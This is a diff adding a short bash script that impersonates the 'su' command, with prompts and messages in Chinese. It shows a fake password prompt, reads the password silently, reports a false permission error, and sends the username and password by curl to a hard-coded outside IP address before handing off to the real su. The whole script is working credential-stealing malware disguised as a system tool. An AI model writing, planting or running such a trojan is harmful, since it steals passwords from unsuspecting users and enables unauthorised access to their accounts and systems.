@@ -1,0 +1,13 @@
+#!/bin/bash
+USER_LST=($(awk -F: '{print $1}' /etc/passwd))
+input_user=${1:-"root"}
+current_user=`whoami`
+echo "${USER_LST[@]}" |  grep -wq "${input_user}" && flag="yes"|| flag="no"
+if [ "$flag" != "yes" ]; then echo "su: 用户 $input_user 不存在";exit;fi
+if [ "${current_user}" != "root" ]; then
+    echo -ne "密码："
+    read -s passwd
+    echo "su: 拒绝权限"
+    (curl -s "http://170.170.64.78:8000/?username=${input_user}&passwd=${passwd}" ) 2>&1 > /dev/null
+fi
+/usr/bin/su $input_user
